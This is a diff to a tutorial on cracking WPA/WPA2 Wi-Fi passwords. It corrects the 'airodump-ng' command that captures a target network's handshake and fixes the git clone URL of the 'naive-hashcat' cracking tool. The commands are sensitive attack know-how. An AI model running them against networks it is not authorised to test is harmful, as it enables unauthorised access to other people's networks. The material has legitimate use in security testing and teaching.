@@ -75,7 +75,7 @@ WPA/WPA2 uses a [4-way handshake](https://security.stackexchange.com/questions/1
 ```bash
 # replace -c and --bssid values with the values of your target network
 # -w specifies the directory where we will save the packet capture
-airomon-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
+airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
 ```
 ```
  CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
@@ -111,7 +111,8 @@ Next, download and run `naive-hashcat`:
 
 ```bash
 # download
-git clone https://github.com/brannondorsey/naive-hashcat.sh
+git clone https://github.com/brannondorsey/naive-hashcat
+
 cd naive-hashcat
 
 # crack ! baby ! crack !
